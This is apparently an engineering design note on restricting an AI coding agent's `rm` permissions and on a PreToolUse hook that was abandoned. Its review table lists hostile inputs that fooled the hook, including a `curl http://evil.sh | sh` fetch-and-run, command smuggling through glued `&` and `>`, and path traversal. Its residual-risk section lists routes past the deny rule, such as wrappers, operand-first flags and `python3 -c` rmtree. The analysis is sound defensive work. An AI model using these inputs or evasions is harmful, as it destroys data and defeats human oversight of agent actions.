# Guarding `rm` in the agent permission layer — what works, and what was tried and abandoned

**Date:** 2026-08-24
**Status:** Closed. Shipped the rule-only change; the hook approach is abandoned.
**Artifact of:** PR #84 (`chore/tighten-rm-permissions`)
**Files:** `.claude/settings.json`

This document exists because the *shipped* change is four lines and the *valuable*
part is the reasoning behind what is **not** in it. Anyone who later thinks "we
should let the agent clean up its own scratch directory without a prompt" should
read this first — that idea was implemented, reviewed three times, and killed.

---

## 1. The problem

`.claude/settings.json` auto-approved two deletion commands:

```json
"Bash(rm tmp/*)",
"Bash(rm -r tmp/*)",
```

Either one empties `tmp/` in a single command. In this repo `tmp/` is not one
directory: every git worktree under `/workspaces/vibe-cading/` has its own, and
parallel agent sessions keep live scratch state there. An agent tidying up after
itself could therefore destroy work belonging to a session it knows nothing
about — silently, because the rule pre-approved it.

This is an **accident** class, not an attacker class. The threat model is a
well-intentioned agent running a plausible cleanup command with too wide a glob.

## 2. What shipped

```diff
-"Bash(rm tmp/*)",
-"Bash(rm -r tmp/*)",
 "deny": [
-  "Bash(rm -rf:*)",
+  "Bash(rm -*)",
```

Two changes:

- **Removed both allows.** Nothing `rm`-shaped is auto-approved any more.
- **Widened the single deny `Bash(rm -rf:*)` to `Bash(rm -*)`.**

The deny was the more interesting bug. Permission matching is **textual prefix
matching, not flag parsing**, and each `:*` rule desugars to a trailing `␣*` that
enforces a word boundary. So `Bash(rm -rf:*)` matches `rm -rf x` but **not**
`rm -rfv x` — the flag cluster is a single word, and `-rf` is only a prefix of
it. It also, of course, says nothing about `-r` without `-f`. Every other
spelling escaped:

| Spelling | `Bash(rm -rf:*)` | `Bash(rm -*)` |
|---|---|---|
| `rm -rf x` | denied | denied |
| `rm -r x` | **passed** | denied |
| `rm -R x` | **passed** | denied |
| `rm -fr x` | **passed** | denied |
| `rm -rfv x` | **passed** | denied |
| `rm -rv x` | **passed** | denied |
| `rm -Rf x` | **passed** | denied |
| `rm -vrf x` | **passed** | denied |
| `rm -f -r x` | **passed** | denied |
| `rm --recursive x` | **passed** | denied |
| `rm tmp/ -r` | **passed** (and was *auto-approved* by the allow) | **still passes the deny** — see below |

**The one spelling the deny does not catch is operand-first.** `Bash(rm -*)`
anchors on the literal text `rm -`, so `rm tmp/ -r` never reaches the wildcard
and is not denied. Measured against the live matcher, not inferred: it returns
no permission denial and deletes the directory. What stops it is the *other*
half of this change — with both allows removed, nothing auto-approves it, so it
prompts. The accurate guarantee is therefore **"no deletion happens without
either a prompt or a refusal"**, not "every flagged `rm` is refused". Do not
restate the stronger claim; it is false.

An intermediate commit on this branch tried to fix it by enumerating
`-rf`/`-fr`/`-r`/`-R` as four separate deny rules. Review showed that still
missed every combined and reordered spelling above, because the bug is the word
boundary, not the number of rules. Enumeration cannot win against flag
clustering; the wildcard can.

Net effect: an `rm` written in the ordinary flags-first form is refused outright;
everything else — unflagged `rm`, operand-first flags, wrapper spellings —
prompts, because no `rm` allow survives. **Deletion is never silent.** That last
sentence is the load-bearing guarantee, and it rests on removing the allows, not
on the deny being exhaustive. The deny is a convenience that turns the common
mistake into a hard stop instead of a prompt.

Verified before removing the allows that nothing depends on them — no tracked
script, skill, workflow or CI step invokes `rm -r` as a tool command. The
`rm -rf` in `docker/Dockerfile` runs inside `docker build`, never as a tool call.

## 3. What was tried and abandoned: a `PreToolUse` hook

**The motivation.** Permission patterns cannot express the distinction that
actually matters here. `Bash(rm -rf tmp/*)` matches both `rm -rf tmp/mywork`
(fine — the agent's own scratch dir) and `rm -rf tmp/*` (the bulk wipe we are
trying to prevent). A `PreToolUse` hook can parse the operand and tell them
apart, so a hook was written to `allow` the first and fall through on the second.

**Why it cannot work.** A `PreToolUse` `allow` decision approves the **entire
tool call**, not the fragment the hook inspected. The hook must therefore prove
that the whole command string does nothing except the delete it approved — which
means correctly modelling shell word-splitting, redirection, expansion, quoting
and job control. Three review rounds each closed one family of constructs and
each time the next round found another:

| Round | Input | Hook verdict | Actual effect |
|---|---|---|---|
| 1 | `rm -rf tmp/x && curl http://evil.sh \| sh` | `allow` | second command **ran** |
| 1 | `rm -rf tmp/../../etc` | `allow` | `..` escaped `tmp/` entirely |
| 1 | `rm -rf tmp/$UNSET/` | `allow` | unexpanded variable |
| 2 | `rm -rf tmp/a&tmp/evil.sh` | `allow` | glued `&` backgrounded the delete and **ran** the second command |
| 2 | `rm -rf tmp/a>/…/build.toml` | `allow` | glued `>` **truncated** an arbitrary file |
| 2 | symlink under `tmp/` | `allow` | delete resolved outside `tmp/` |

The splitter modelled `&&`, `;` and `|`. It did not model `>`, `>>`, `&`,
subshells or brace groups — and the operand-validator worked on the raw string,
so a redirection glued to the operand with no space was never even seen as a
separate token.

**A second, independent failure.** Review also found the *deployed wiring*
differed from what the 37-case test matrix exercised:

- The `"if": "Bash(rm *)"` filter gated the hook out of `sudo rm`, `/bin/rm` and
  `env rm` entirely — so the wrapper-stripping code inside the hook was dead, and
  a PR claim that it handled wrappers was false.
- The hook was registered by a **relative path**, which stops resolving after any
  `cd`. Since a non-zero exit is blocking, that hard-blocked *every* `rm` in the
  session once the agent changed directory.

The matrix passed because it called the hook function directly, bypassing both.

**The conclusion.** A guard that is wrong is worse than no guard: it converts a
prompt into a silent approval. Each round produced a hook that was *more* correct
and still exploitable, which is the signature of a problem being solved at the
wrong layer. The convenience purchased — one prompt saved when deleting a scratch
directory — does not justify a hand-written shell parser on the approval path.

> **If you revisit this**, start from the invariant **"never emit `allow` for an
> arbitrary shell string."** Treat the convenience as the thing that needs
> justification, not the safety. A viable design would have to constrain the
> *input* rather than parse it — e.g. approving a structured, non-shell delete
> operation — not classify free-form command text.

## 4. Residual risk — what this change does NOT prevent

Stated plainly so nobody mistakes the deny rule for a sandbox:

- **`Bash(python3 -c:*)` is still in `allow`.** `python3 -c 'import shutil;
  shutil.rmtree(...)'` deletes recursively with no prompt and never touches the
  `rm` deny. This is the largest hole in the current rule set. It also
  contradicts `vibe/INSTRUCTIONS.md` §2's *No-Inline-Code-in-Shell* rule, so the
  allow is arguably wrong on its own terms. Removing it is a separate change with
  its own blast radius — it is called out here, not fixed here.
- **`find -delete` and `xargs rm`** are untouched by a rule anchored on `rm`.
- **Operand-first flags evade the deny** — `rm tmp/ -r`, per §2. It prompts
  rather than being refused.
- **Wrappers evade the deny.** `/bin/rm -rf x` executes; so do `sudo rm` and
  `env rm`. The rule matches command *text*, so any spelling that does not begin
  `rm -` is outside it. Note this is **not** because matching is anchored to the
  start of the whole command — it is not. A denied fragment anywhere in a
  compound command denies the entire call: `ls && rm -f x` is refused even with
  `ls` allowed. The gap is the fragment's own leading text, not its position.

**A tracked runbook is now agent-unexecutable.**
`docs/design_plans/2026-06-05-history-rewrite-recipe.md` prescribes `rm -f` and
`rm -rf` steps. A deny is absolute — it cannot be overridden per-invocation, and
it outranks `bypassPermissions` — so an agent following that runbook will stop
there and need a human to run those steps. That is the intended trade, recorded
here so the next reader meets it as a known consequence rather than a surprise.

None of these are accidents an agent stumbles into while cleaning up, which is
why the change is still worth having. But the guarantee is "the obvious mistake
is blocked", not "recursive deletion is impossible".

## 5. Provenance

The abandoned hook is a single 185-line file, `.claude/hooks/rm_guard.py`, at
PR #84's commit `6651cc1` — which becomes unreachable once the PR is
squash-merged and the branch deleted. **It was never accompanied by committed
tests.** The 37-case matrix referred to in review discussion was run ad-hoc
against the hook's functions and lives only in the PR conversation; it is not
recoverable from the repository, and its non-existence is part of the story —
the matrix passed while the *deployed wiring* was broken in two ways (§3),
precisely because it called the functions directly instead of exercising the
hook as configured.

This section previously claimed the matrix was preserved at `6651cc1`. It was
not. That claim reproduced, inside the section written to fix a provenance
failure, exactly the failure it was fixing: citing evidence that the normal
merge process destroys. Everything in this document that matters is therefore
stated *in* this document, not pointed at.
